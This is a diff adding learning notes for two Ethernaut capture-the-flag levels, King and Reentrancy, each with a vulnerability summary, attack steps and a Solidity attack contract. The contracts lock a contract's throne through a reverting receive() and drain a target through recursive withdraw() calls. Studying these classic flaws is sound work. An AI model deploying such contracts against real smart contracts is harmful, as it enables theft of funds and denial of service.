@@ -262,3 +262,76 @@ function unlock(bytes32 _password) public {
 
 ```
 ---
+### [Level Name - 9.King]
+
+☢️  Vulnerability Concept: 
+Denial of Service via failing `.transfer()` — the contract assumes the king can always receive Ether.
+
+🛠️ Exploit Mechanism:
+Deploy a contract with no `receive()` or one that explicitly `revert()`s on receiving Ether. This makes the King contract unable to send Ether to the new king, locking the throne permanently.
+
+🔁 Real-World Example: 
+This is a textbook DoS case — relying on `.transfer()` in smart contracts can break if the recipient reverts (e.g., Gnosis Safe in early versions).
+
+✍️ My Attack Summary (in 2–3 steps):
+1. Deployed a contract that calls the King contract with > prize.
+2. That contract becomes king, but reverts on further ETH.
+3. Ethernaut can no longer dethrone it — challenge passes.
+
+📦 Solidity Snippet I Learned:
+```solidity
+contract KingBlocker {
+    constructor(address target) payable {
+        (bool success,) = target.call{value: msg.value}("");
+        require(success, "Failed to become king");
+    }
+
+    // Revert any ETH sent in the future
+    receive() external payable {
+        revert("Can't dethrone me.");
+    }
+```
+
+---
+
+### [Level Name - 10.Reentrancy]
+
+☢️  Vulnerability Concept: 
+Classic reentrancy — contract sends Ether before updating state (`balances[msg.sender]`), allowing recursive withdrawal.
+
+🛠️ Exploit Mechanism:
+Create a contract that donates ETH and triggers `withdraw()`. In the `receive()` function, recursively call `withdraw()` again before the balance is updated.
+
+🔁 Real-World Example: 
+Similar to TheDAO hack in 2016 — reentrancy remains one of the most dangerous vulnerabilities if not mitigated with `checks-effects-interactions` or `ReentrancyGuard`.
+
+✍️ My Attack Summary (in 2–3 steps):
+1. Wrote a contract that donates ETH to Reentrance.
+2. Called `withdraw()` with `msg.value` stored as state.
+3. On receiving ETH, re-entered until Reentrance was drained.
+
+📦 Solidity Snippet I Learned:
+```solidity
+contract ReentrancyAttack {
+    Reentrance public reentrancy;
+    uint public attackAmount;
+
+    constructor(address payable _target) public {
+        reentrancy = Reentrance(_target);
+    }
+
+    function attack() public payable {
+        require(msg.value > 0, "Need ETH");
+        attackAmount = msg.value;
+        reentrancy.donate{value: msg.value}(address(this));
+        reentrancy.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(reentrancy).balance > 0) {
+            reentrancy.withdraw(attackAmount);
+        }
+    }
+}
+```
+---
